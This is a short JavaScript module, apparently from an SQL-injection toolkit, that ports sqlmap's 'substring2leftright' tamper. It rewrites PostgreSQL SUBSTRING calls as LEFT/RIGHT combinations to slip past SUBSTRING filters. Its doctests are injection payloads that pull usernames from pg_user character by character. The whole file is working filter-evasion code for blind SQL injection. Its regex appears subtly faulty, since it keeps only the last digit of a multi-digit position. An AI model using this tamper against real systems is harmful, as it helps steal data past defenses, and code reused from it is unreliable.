// 对标 sqlmap substring2leftright.py（PostgreSQL 专用）：
// SUBSTRING(A FROM B FOR C) 拼写改写为 LEFT/RIGHT 组合
// FOR 1 时：pos==1 → LEFT(A,1)；pos>1 → LEFT(RIGHT(A,1-pos),1)
// （PostgreSQL RIGHT 负参数表示从左侧截断）
export const substring2leftright = {
  name: 'substring2leftright',
  description: '将 PostgreSQL SUBSTRING(A FROM B FOR 1) 改写为 LEFT/RIGHT 组合（绕过 SUBSTRING 过滤）',
  doctests: [
    { input: 'SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)', output: 'LEFT((SELECT usename FROM pg_user)::text,1)' },
    { input: 'SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1)', output: 'LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)' },
    { input: '1 AND 1=1', output: '1 AND 1=1' },
  ],
  transform(payload) {
    const s = String(payload ?? '');
    if (!s) return s;
    const m = s.match(/SUBSTRING\((.+?)\s+FROM[^)]+(\d+)[^)]+FOR[^)]+1\)/);
    if (!m) return s;
    const pos = Number(m[2]);
    const replacement = pos === 1 ? `LEFT(${m[1]},1)` : `LEFT(RIGHT(${m[1]},${1 - pos}),1)`;
    return s.replace(m[0], replacement);
  },
};
export default substring2leftright;
